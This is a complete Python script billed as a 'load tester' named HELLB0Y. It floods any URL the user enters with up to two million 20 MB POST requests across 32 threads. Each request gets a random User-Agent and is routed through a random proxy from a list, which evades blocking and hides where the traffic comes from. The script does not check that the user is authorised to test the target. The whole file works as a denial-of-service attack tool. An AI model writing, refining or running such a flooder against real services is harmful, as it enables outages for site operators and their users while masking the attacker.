#!/usr/bin/env python3
"""
HELLB0Y - High-throughput load tester v2 (Optimised)
Sends up to 2,000,000 POST requests (20 MB each) with 32 concurrent workers.
Random User‑Agent + random proxy per request.
Progress printed every second, detailed log to file.
"""

import requests
import time
import sys
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------------------
#  BANNER
# ---------------------------
BANNER = """
██╗  ██╗███████╗██╗     ██╗     ██████╗  ██████╗ ██╗   ██╗
██║  ██║██╔════╝██║     ██║     ██╔══██╗██╔═══██╗╚██╗ ██╔╝
███████║█████╗  ██║     ██║     ██████╔╝██║   ██║ ╚████╔╝ 
██╔══██║██╔══╝  ██║     ██║     ██╔══██╗██║   ██║  ╚██╔╝  
██║  ██║███████╗███████╗███████╗██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═════╝  ╚═════╝    ╚═╝   
"""
print(BANNER)
print(">>> HELLB0Y LOAD TESTER v2 (Optimised) <<<\n")

# ---------------------------
#  INPUT
# ---------------------------
URL = input("Enter target URL: ").strip()
if not URL:
    print("No URL provided. Exiting.")
    sys.exit(1)

PROXY_FILE = input("Path to proxy list file (Enter to skip): ").strip()
proxies = []
if PROXY_FILE:
    try:
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        print(f"[+] Loaded {len(proxies)} proxies")
    except FileNotFoundError:
        print(f"[!] File '{PROXY_FILE}' not found. No proxies used.")
else:
    print("[!] No proxies – all traffic from your IP.")

while True:
    try:
        qty = int(input("Number of requests (max 2,000,000): "))
        if 1 <= qty <= 2_000_000:
            break
        print("Please enter a number between 1 and 2,000,000.")
    except ValueError:
        print("Invalid number.")

TOTAL_REQUESTS = qty
PAYLOAD_SIZE_MB = 20
CONCURRENT_WORKERS = 32

# ---------------------------
#  PAYLOAD
# ---------------------------
emoji_str = "👿😈"
emoji_bytes = emoji_str.encode("utf-8")
repeats = (PAYLOAD_SIZE_MB * 1024 * 1024) // len(emoji_bytes) + 1
payload = (emoji_bytes * repeats)[:PAYLOAD_SIZE_MB * 1024 * 1024]

# ---------------------------
#  SHARED DATA
# ---------------------------
lock = threading.Lock()
count_success = 0
count_fail = 0
start_time = time.time()

# Log file (optional)
LOG_FILE = "hellboy_log.txt"
log_lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
]

def get_random_proxy():
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {'http': proxy, 'https': proxy}

def send_request(request_id):
    global count_success, count_fail
    success = False
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    proxy_dict = get_random_proxy()
    try:
        resp = requests.post(URL, data=payload, headers=headers,
                             proxies=proxy_dict, timeout=30)
        if 200 <= resp.status_code < 300:
            success = True
    except Exception:
        success = False

    with lock:
        if success:
            count_success += 1
        else:
            count_fail += 1

    # Write detailed log to file (optional)
    with log_lock:
        with open(LOG_FILE, 'a', encoding='utf-8') as log:
            status = "SUCCESS" if success else "FAIL"
            log.write(f"{status} | Request #{request_id}\n")

    return success

# ---------------------------
#  PROGRESS THREAD
# ---------------------------
def show_progress():
    while True:
        time.sleep(1)
        with lock:
            done = count_success + count_fail
            if done >= TOTAL_REQUESTS:
                break
            elapsed = time.time() - start_time
            rate = done / elapsed if elapsed > 0 else 0
            # Simple one‑line progress bar (overwrites itself)
            print(f"\r[+] Sent: {done}/{TOTAL_REQUESTS} | "
                  f"Success: {count_success} | Fail: {count_fail} | "
                  f"Rate: {rate:.1f} req/s   ", end='', flush=True)

# ---------------------------
#  MAIN
# ---------------------------
print(f"\n[*] Target: {URL}")
print(f"[*] Total requests: {TOTAL_REQUESTS}")
print(f"[*] Payload: {PAYLOAD_SIZE_MB} MB | Workers: {CONCURRENT_WORKERS}")
if proxies:
    print(f"[*] Proxies: {len(proxies)} random IPs per request")
print(f"[*] Detailed log: {LOG_FILE}\n")

print("[*] Sending now (real‑time, no terminal lag)...\n")

progress_thread = threading.Thread(target=show_progress, daemon=True)
progress_thread.start()

with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
    futures = {executor.submit(send_request, i): i for i in range(TOTAL_REQUESTS)}
    for future in as_completed(futures):
        pass

# Final newline after progress bar
print()
elapsed = time.time() - start_time
print("\n==================== FINAL RESULTS ====================")
print(f" Total time:        {elapsed:.2f} seconds")
print(f" Successful:        {count_success}")
print(f" Failed:            {count_fail}")
if TOTAL_REQUESTS > 0:
    print(f" Success rate:      {count_success / TOTAL_REQUESTS * 100:.2f}%")
if elapsed > 0:
    print(f" Average rate:      {TOTAL_REQUESTS / elapsed:.2f} req/s")
print(f" Log saved to:      {LOG_FILE}")
print("======================================================")